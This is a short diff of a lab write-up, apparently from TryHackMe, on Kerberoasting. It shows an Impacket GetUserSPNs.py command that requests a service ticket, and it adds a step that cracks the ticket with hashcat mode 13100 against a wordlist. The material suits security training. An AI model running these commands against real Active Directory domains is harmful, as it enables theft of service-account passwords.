@@ -21,8 +21,13 @@ we can send a request to get a **TGS** ticket for the ```srv-user``` user using 
 ```
 GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm -request-user svc-user
 ```
+**Crack the TGS**
 
+If we got the sevice TGS we could crack it to dump the password using ```hashcat```
 
+```
+hashcat -m 13100 hashes.txt /path/to/wordlist.txt
+```
 
 
 
